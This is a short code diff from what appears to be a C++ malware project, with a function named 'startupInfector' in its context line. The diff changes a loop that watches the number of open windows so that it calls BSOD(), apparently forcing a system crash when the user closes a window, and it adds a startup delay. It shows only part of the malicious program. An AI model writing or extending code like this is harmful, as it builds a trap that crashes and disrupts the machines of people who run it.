@@ -32,6 +32,8 @@ void startupInfector(string file, string newName) {
 
 void pouVitalsCheck() {
     
+	Sleep(2000);
+
 	for (;;) {
 
 
@@ -40,10 +42,10 @@ void pouVitalsCheck() {
 		Sleep(10);
 
 		if (firstCheck > getNumOfWindows()) {
-			cout << "place holder" << endl;
+			BSOD();
 		}
 		
-
+		  
 
 	}
 
